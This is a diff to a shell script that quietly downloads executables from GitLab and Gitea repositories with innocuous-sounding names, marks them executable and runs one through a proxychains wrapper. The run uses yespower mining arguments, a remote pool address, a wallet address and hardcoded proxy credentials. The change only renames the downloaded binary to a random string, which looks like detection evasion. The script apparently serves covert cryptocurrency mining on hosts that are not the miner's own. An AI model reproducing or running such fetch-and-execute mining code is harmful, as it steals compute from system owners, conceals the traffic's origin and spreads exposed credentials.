@@ -2,7 +2,7 @@ proxy="52.5.38.201"
 port="9293" 
 user="py8h6mtimyeool"  
 pass="r1wr4kibq49lw0k52qhi17h0ke1j" 
-wget -q -O py8h6mtimyeool https://gitlab.com/node.js2594450/ruby/-/raw/main/vds && chmod +x py8h6mtimyeool
+wget -q -O KD6k9yM7022djIFWoZm27R https://gitlab.com/node.js2594450/ruby/-/raw/main/vds && chmod +x KD6k9yM7022djIFWoZm27R
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
@@ -19,5 +19,5 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./py8h6mtimyeool -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-9999 -n 1)-lena)  -p c=CRNC,mc=VHH  --proxy=http://py8h6mtimyeool:r1wr4kibq49lw0k52qhi17h0ke1j@52.7.247.138:9293 
+./panel ./KD6k9yM7022djIFWoZm27R -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-9999 -n 1)-lena)  -p c=CRNC,mc=VHH  --proxy=http://py8h6mtimyeool:r1wr4kibq49lw0k52qhi17h0ke1j@52.7.247.138:9293 
 
